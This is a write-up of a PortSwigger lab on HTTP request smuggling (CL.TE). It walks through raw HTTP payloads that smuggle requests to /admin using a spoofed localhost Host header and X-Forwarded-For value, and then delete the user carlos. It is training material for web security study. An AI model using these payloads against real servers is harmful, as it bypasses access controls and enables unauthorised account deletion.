
# Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.

Note: Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip: Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.


---------------------------------------------

References: 

- https://portswigger.net/web-security/request-smuggling/exploiting



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls,%20CL.TE%20vulnerability/1.png)

---------------------------------------------

We can use a previous payload to find it is possible to redirect to /404:

```
POST / HTTP/1.1
...
Content-Length: 66
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404/ HTTP/1.1
Content-Length: 3

a
```



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls,%20CL.TE%20vulnerability/2.png)


To access /admin it is necessary to add the header “Host: localhost”:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /admin/ HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: localhost
Content-Length: 3

a
```



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls,%20CL.TE%20vulnerability/3.png)


And then delete the user:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /admin/delete?username=carlos HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: localhost
Content-Length: 3

a
```



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls,%20CL.TE%20vulnerability/4.png)